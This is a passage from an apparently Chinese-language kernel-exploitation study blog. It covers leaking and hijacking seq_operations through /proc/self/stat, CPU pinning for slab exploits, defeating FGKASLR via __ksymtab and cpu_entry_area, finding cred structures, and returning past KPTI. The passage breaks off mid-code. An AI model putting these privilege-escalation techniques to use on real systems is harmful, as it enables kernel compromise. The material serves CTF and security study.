class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">size_t</span> from;</span><br><span class="line">    <span class="type">size_t</span> count;</span><br><span class="line">    <span class="type">size_t</span> pad_until;</span><br><span class="line">    <span class="type">loff_t</span> index;</span><br><span class="line">    <span class="type">loff_t</span> read_pos;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span></span><br><span class="line">    <span class="type">int</span> poll_event;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但这个结构体是通过<code>seq_open()</code> 使用kzalloc从单独的<code>seq_file_cache</code>分配的,我们很难进行操控</p><p>不过其中的函数表成员 op 在打开文件时通过 kmalloc 进行动态分配</p><p>为了更进一步简化内核接口的实现，seq_file 接口提供了 single_open() 这个简化的初始化 file 的函数，其定义于 <code>fs/seq_file.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">single_open</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">int</span> (*show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *),</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span> =</span> kmalloc(<span class="keyword">sizeof</span>(*op), GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="type">int</span> res = -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op-&gt;start = single_start;</span><br><span class="line">        op-&gt;next = single_next;</span><br><span class="line">        op-&gt;stop = single_stop;</span><br><span class="line">        op-&gt;show = show;</span><br><span class="line">        res = seq_open(file, op);</span><br><span class="line">        <span class="keyword">if</span> (!res)</span><br><span class="line">            ((<span class="keyword">struct</span> seq_file *)file-&gt;private_data)-&gt;private = data;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            kfree(op);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(single_open);</span><br></pre></td></tr></table></figure><p>seq_operations定义于 <code>/include/linux/seq_file.h</code> 当中，只定义了四个函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">    <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line">    <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其会从kmalloc-32中申请obj</p><h3 id="分配与释放"><a href="#分配与释放" class="headerlink" title="分配与释放"></a>分配与释放</h3><p>前面我们得知通过 single_open() 函数可以分配 seq_operations 结构体，阅读内核源码，我们注意到存在如下调用链：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat_open()        &lt;--- stat_proc_ops.proc_open</span><br><span class="line">    single_open_size()</span><br><span class="line">        single_open()</span><br></pre></td></tr></table></figure><p>注意到 stat_open() 为 procfs 中的 stat 文件对应的 proc_ops 函数表中 open 函数对应的默认函数指针，在内核源码 <code>fs/proc/stat.c</code> 中有如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> <span class="title">stat_proc_ops</span> =</span> &#123;</span><br><span class="line">    .proc_flags    = PROC_ENTRY_PERMANENT,</span><br><span class="line">    .proc_open    = stat_open,</span><br><span class="line">    .proc_read_iter    = seq_read_iter,</span><br><span class="line">    .proc_lseek    = seq_lseek,</span><br><span class="line">    .proc_release    = single_release,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">proc_stat_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    proc_create(<span class="string">&quot;stat&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, &amp;stat_proc_ops);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">fs_initcall(proc_stat_init);</span><br></pre></td></tr></table></figure><p>即该文件对应的是 <code>/proc/id/stat</code> 文件，那么只要我们打开 <code>proc/self/stat</code> 文件便能分配到新的 seq_operations 结构体</p><p>对应地，在定义于 <code>fs/seq_file.c</code> 中的 <code>single_release()</code> 为 stat 文件的 proc_ops 的默认 release 指针，其会释放掉对应的 seq_operations 结构体，故我们只需要关闭文件即可释放该结构体</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>数据泄露</strong></p><p>seq_operations 结构体中有着四个内核指针,若能泄露则可获得内核<code>.text</code>的基址</p><p><strong>劫持内核执行流</strong></p><p>当我们 read 一个 stat 文件时，内核会调用其 proc_ops 的 <code>proc_read_iter</code> 指针，其默认值为 <code>seq_read_iter()</code> 函数，定义于 <code>fs/seq_file.c</code> 中，注意到有如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read_iter</span><span class="params">(<span class="keyword">struct</span> kiocb *iocb, <span class="keyword">struct</span> iov_iter *iter)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);</span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>即其会调用 seq_operations 中的 start 函数指针，那么<strong>我们只需要控制 seq_operations-&gt;start 后再读取对应 stat 文件便能控制内核执行流</strong></p><p><code>read(seq_fd,buf,10)</code></p><h2 id="cpu绑定"><a href="#cpu绑定" class="headerlink" title="cpu绑定"></a>cpu绑定</h2><p>slub allocator 会优先从当前核心的 <code>kmem_cache_cpu</code> 中进行内存分配，在多核架构下存在多个 <code>kmem_cache_cpu</code> ，由于进程调度算法会保持核心间的负载均衡，因此我们的 exp 进程可能会被在不同的核心上运行，这也就导致了利用过程中 kernel object 的分配有可能会来自不同的 <code>kmem_cache_cpu</code> ，这使得利用模型变得复杂，也降低了漏洞利用的成功率</p><p>因此为了保证漏洞利用的稳定，<strong>需要将进程绑定到特定的某个 CPU 核心上</strong>，这样 slub allocator 的模型对我们而言便简化成了 <code>kmem_cache_node + kmem_cache_cpu</code> ，我们也能更加方便地进行漏洞利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h2><p>即Function Granular KASLR,参考(<a href="https://lwn.net/Articles/877487/">Function Granular KASLR</a>)</p><p>传统的kaslr具有以下2个缺点:</p><ol><li>低熵,针对代码段随机化粒度较小,运气好几百次就能够爆破出来</li><li>只要泄露出一个地址,那么所有的地址都会被暴露</li></ol><p>fgkaslr可以看作是kaslr的plus版,它在函数级粒度上随机化地址空间的布局</p><p>其依赖于GCC可以选择将函数放入单独的<code>.text</code>部分,在开启fgkasalr后任何用 C 编写且不存在于特殊输入部分的内容都是随机的,被单独归为<code>.text.*</code>。当然如果是直接用汇编写的,那么依然会被保留在<code>.text</code></p><blockquote><p>The boot kernel was modified to parse the vmlinux elf file after<br>decompression to check for our interesting symbols that we kept, and to<br>look for any .text.<em> sections to randomize. The consolidated .text section<br>is skipped and not moved. The sections are shuffled randomly, and copied<br>into memory following the .text section in a new random order. The existing<br>code which updated relocation addresses was modified to account for<br>not just a fixed delta from the load address, but the offset that the function<br>section was moved to. This requires inspection of each address to see if<br>it was impacted by a randomization. We use a bsearch to make this less<br>horrible on performance. Any tables that need to be modified with new<br>addresses or resorted are updated using the symbol addresses parsed from the<br>elf symbol table.引导内核被修改为在解压后解析 vmlinux elf 文件，以检查我们保留的有趣符号，并查找任何要随机化的 .text.</em> 部分。合并的 .text 部分将被跳过且不会移动。这些部分被随机打乱，并以新的随机顺序复制到 .text 部分之后的内存中。更新重定位地址的现有代码经过修改，不仅考虑了加载地址的固定增量，还考虑了函数部分移动到的偏移量。这需要检查每个地址以查看它是否受到随机化的影响。我们使用 bsearch 来减少这种对性能的影响。任何需要用新地址修改或重新排序的表都使用从 elf 符号表解析的符号地址进行更新。In order to hide our new layout, symbols reported through /proc/kallsyms<br>will be sorted by name alphabetically rather than by address.为了隐藏我们的新布局，通过 /proc/kallsyms 报告的符号将按名称字母顺序而不是地址排序。</p></blockquote><p>随机化判断逻辑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    linux/arch/x86/boot/compressed/fgkaslr.c</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">layout_randomized_image</span><span class="params">(<span class="type">void</span> *output, Elf64_Ehdr *ehdr, Elf64_Phdr *phdrs)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    shnum = ehdr-&gt;e_shnum; <span class="comment">//获取节区的数量</span></span><br><span class="line">    shstrndx = ehdr-&gt;e_shstrndx; <span class="comment">//获取字符串的索引</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* we are going to need to allocate space for the section headers */</span></span><br><span class="line">    sechdrs = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sechdrs) * shnum); <span class="comment">//开辟一段空间用于防止节区头部</span></span><br><span class="line">    <span class="keyword">if</span> (!sechdrs)</span><br><span class="line">        error(<span class="string">&quot;Failed to allocate space for shdrs&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sections = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*sections) * shnum); <span class="comment">//开辟一段空间用户防止节区的内容</span></span><br><span class="line">    <span class="keyword">if</span> (!sections)</span><br><span class="line">        error(<span class="string">&quot;Failed to allocate space for section pointers&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(sechdrs, output + ehdr-&gt;e_shoff,</span><br><span class="line">          <span class="keyword">sizeof</span>(*sechdrs) * shnum); <span class="comment">//拷贝头部数据</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we need to allocate space for the section string table */</span></span><br><span class="line">    s = &amp;sechdrs[shstrndx]; <span class="comment">//获取节区名</span></span><br><span class="line"></span><br><span class="line">    secstrings = <span class="built_in">malloc</span>(s-&gt;sh_size); <span class="comment">//开辟一段空间用于防止节区名称</span></span><br><span class="line">    <span class="keyword">if</span> (!secstrings)</span><br><span class="line">        error(<span class="string">&quot;Failed to allocate space for shstr&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(secstrings, output + s-&gt;sh_offset, s-&gt;sh_size); <span class="comment">//拷贝节区名称</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * now we need to walk through the section headers and collect the</span></span><br><span class="line"><span class="comment">     * sizes of the .text sections to be randomized.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; shnum; i++) &#123; <span class="comment">//遍历节区，选择需要重定位的节区</span></span><br><span class="line">        s = &amp;sechdrs[i];</span><br><span class="line">        sname = secstrings + s-&gt;sh_name;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (s-&gt;sh_type == SHT_SYMTAB) &#123; <span class="comment">//遇到符号节区跳过</span></span><br><span class="line">            <span class="comment">/* only one symtab per image */</span></span><br><span class="line">            <span class="keyword">if</span> (symtab)</span><br><span class="line">                error(<span class="string">&quot;Unexpected duplicate symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">            symtab = <span class="built_in">malloc</span>(s-&gt;sh_size);</span><br><span class="line">            <span class="keyword">if</span> (!symtab)</span><br><span class="line">                error(<span class="string">&quot;Failed to allocate space for symtab&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">memcpy</span>(symtab, output + s-&gt;sh_offset, s-&gt;sh_size);</span><br><span class="line">            num_syms = s-&gt;sh_size / <span class="keyword">sizeof</span>(*symtab);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.text&quot;</span>)) &#123; <span class="comment">//第一个.text的节区直接跳过</span></span><br><span class="line">            <span class="keyword">if</span> (text)</span><br><span class="line">                error(<span class="string">&quot;Unexpected duplicate .text section&quot;</span>);</span><br><span class="line">            text = s;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sname, <span class="string">&quot;.data..percpu&quot;</span>)) &#123; <span class="comment">//遇到.data..precpu的节区也直接跳过</span></span><br><span class="line">            <span class="comment">/* get start addr for later */</span></span><br><span class="line">            percpu = s;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(s-&gt;sh_flags &amp; SHF_ALLOC) ||</span><br><span class="line">            !(s-&gt;sh_flags &amp; SHF_EXECINSTR) ||</span><br><span class="line">            !(strstarts(sname, <span class="string">&quot;.text&quot;</span>))) <span class="comment">//若一个节区具有SHF_ALLOC与SHF_EXECINSTR的标志位，并且节区名的前缀属于.text则会进行细粒度的地址随机化</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        sections[num_sections] = s; <span class="comment">//剩余的节区都放置到新开辟的空间中，进行细粒度的地址随机化</span></span><br><span class="line">        num_sections++;</span><br><span class="line">    &#125;</span><br><span class="line">    sections[num_sections] = <span class="literal">NULL</span>;</span><br><span class="line">    sections_size = num_sections;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，只有同时满足以下条件的节区才会参与随机化</p><ul><li>节区名符合 <code>.text.*</code> </li><li>section flags 中包含<code>SHF_ALLOC</code></li><li>section flags 中包含<code>SHF_EXECINSTR</code></li></ul><p>不过好在<code>.text</code>中就有很多可以利用的gadget,可以将其弱化为kaslr</p><h3 id="ksymtab"><a href="#ksymtab" class="headerlink" title="__ksymtab"></a>__ksymtab</h3><p>fgkaslr会提供<code>__ksymtab</code>表以支持随机化,而<code>__ksymtab</code>又是不随机化的,所以可以通过其泄露地址</p><p><strong>ksymtab 中每个记录项的名字的格式为 `</strong>ksymtab_func_name<code>，以</code>prepare_kernel_cred<code>为例，对应的记录项的名字为</code>__ksymtab_prepare_kernel_cred`，因此，我们可以直接通过该名字在 IDA 里找到对应的位置，如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__ksymtab:FFFFFFFF81F8D4FC __ksymtab_prepare_kernel_cred dd 0FF5392F4h</span><br><span class="line">__ksymtab:FFFFFFFF81F8D500                 dd 134B2h</span><br><span class="line">__ksymtab:FFFFFFFF81F8D504                 dd 1783Eh</span><br></pre></td></tr></table></figure><p><code>__ksymtab</code> 每一项的结构为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernel_symbol</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> value_offset;</span><br><span class="line">    <span class="type">int</span> name_offset;</span><br><span class="line">    <span class="type">int</span> namespace_offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>第一个表项记录了重定位表项相对于当前地址的偏移。那么，<code>prepare_kernel_cred</code> 的地址应该为 <code>0xFFFFFFFF81F8D4FC-(2**32-0xFF5392F4)=0xffffffff814c67f0</code>。实际上也确实如此。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0                 public prepare_kernel_cred</span><br><span class="line">.text.prepare_kernel_cred:FFFFFFFF814C67F0 prepare_kernel_cred proc near </span><br></pre></td></tr></table></figure><h2 id="cpu-entry-area-mapping"><a href="#cpu-entry-area-mapping" class="headerlink" title="cpu_entry_area mapping"></a>cpu_entry_area mapping</h2><p>在内核官方文档给出的虚拟内存布局中,有这么一个区域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffffe0000000000 |   -2    TB | fffffe7fffffffff |  0.5 TB | cpu_entry_area mapping</span><br></pre></td></tr></table></figure><p>这里找到了一些相关的资料</p><blockquote><p><code>cpu_entry_area</code> contains all the data and code needed to allow the CPU to hand control over to the kernel. You can see its definition in <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/include/asm/cpu_entry_area.h"><code>arch/x86/include/asm/cpu_entry_area.h</code></a>: it contains</p><ul><li>the GDT;</li><li>the entry stack;</li><li>the TSS;</li><li>a set of trampolines;</li><li>the exception stacks;</li><li>debug stores and buffers.</li></ul><p>The trampolines contain the entry points for syscalls; see for example <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/x86/entry/entry_64.S"><code>arch/x86/entry/entry_64.S</code></a> which defines the entry point for 64-bit calls.</p></blockquote><p>里面存储了一些cpu与内核之间需要共享的信息</p><p>对于kernel pwn来说我们只需要知道,这个区域存储着一些<code>.text</code>段的指针</p><p>并且最棒的是这个区域不参与地址随机化,所以这个区域完全可以用来泄露基址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xfffffe0000000004</span> <span class="number">20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0xfffffe0000000004</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0xfffffe000000000c</span> ◂— <span class="number">0x10114000000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0xfffffe0000000014</span> —▸ <span class="number">0xffffffff90e08e03</span> ◂— nop </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0xfffffe000000001c</span> ◂— <span class="number">0x10162000000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0xfffffe0000000024</span> —▸ <span class="number">0xffffffff90e08e02</span> ◂— nop </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0xfffffe000000002c</span> ◂— <span class="number">0x1011a000000000</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0xfffffe0000000034</span> —▸ <span class="number">0xffffffff90e0ee00</span> ◂— nop </span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0xfffffe000000003c</span> ◂— <span class="number">0x100d0000000000</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0xfffffe0000000044</span> —▸ <span class="number">0xffffffff90e0ee00</span> ◂— nop </span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0xfffffe000000004c</span> ◂— <span class="number">0x100d3000000000</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0xfffffe0000000054</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0xfffffe000000005c</span> ◂— <span class="number">0x100d6000000000</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0xfffffe0000000064</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0xfffffe000000006c</span> ◂— <span class="number">0x100d9000000000</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0xfffffe0000000074</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0xfffffe000000007c</span> ◂— <span class="number">0x100dc000000000</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0xfffffe0000000084</span> —▸ <span class="number">0xffffffff90e08e01</span> ◂— nop </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0xfffffe000000008c</span> ◂— <span class="number">0x100df000000000</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0xfffffe0000000094</span> —▸ <span class="number">0xffffffff90e08e00</span> ◂— nop </span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0xfffffe000000009c</span> ◂— <span class="number">0x100e2000000000</span></span><br></pre></td></tr></table></figure><h2 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h2><p>在Linux下，对于每一个进程，内核都会申请一块struct task_struct结构体来保存进程信息 由全局结构体init_task为链表头，<u>由struct list_head children双向循环链表链接其他进程的task_struct</u></p><p>特别要注意到，struct list_head children中的next指针指向的是下一个task_struct中<strong>children成员 + 0x10</strong>，而非task_struct头部或list_head的next指针</p><h2 id="内存搜索进程"><a href="#内存搜索进程" class="headerlink" title="内存搜索进程"></a>内存搜索进程</h2><p>当我们获得了搜索内存的能力之后,为了进一步的提权,就需要找到cred或者task_struct结构体</p><p>但是在茫茫二进制中如何找到这些数据是一个难题</p><p>但好在我们可以利用一些标志性的数据来判断是否命中</p><p>例如<code>prctl(PR_SET_NAME,&quot;new_process_name&quot;)</code>可以修改本进程<code>comm</code>字段的内容,而comm附近有存在cred指针</p><p>又或者利用<code>init_task</code>不停遍历所有的task_struct结构体,然后通过pid,canary,comm等确认结构体</p><p>对于init_task对应的pid 0进程而言，pid和t_pid均为0，stack_canary为低八位为0其他位不为0的8字节数，comm通常为”swapper/0″</p><h2 id="bypass-kpti"><a href="#bypass-kpti" class="headerlink" title="bypass_kpti"></a>bypass_kpti</h2><p>KPTI中每个进程有两套页表——内核态页表与用户态页表(两个地址空间)。内核态页表只能在内核态下访问，可以创建到内核和用户的映射（不过用户空间受SMAP和SMEP保护）。用户态页表只包含用户空间。不过由于涉及到上下文切换，所以在用户态页表中必须包含部分内核地址，用来建立到中断入口和出口的映射。</p><p>当中断在用户态发生时，就涉及到切换CR3寄存器，从用户态地址空间切换到内核态的地址空间。中断上半部的要求是尽可能的快，从而切换CR3这个操作也要求尽可能的快。为了达到这个目的，KPTI中将内核空间的PGD和用户空间的PGD连续的放置在一个8KB的内存空间中(<strong>内核态在低位，用户态在高位</strong>).<strong>这段空间必须是8K对齐的</strong>，这样将CR3的切换操作转换为将CR3值的第13位(由低到高)的置位或清零操作，提高了CR3切换的速度。</p><p>kernel pwn中需要用到的一般就是在提权后顺利返回到用户态</p><p>所以有一种方法就是利用swapgs_restore_regs_and_return_to_usermode这个函数返回</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td 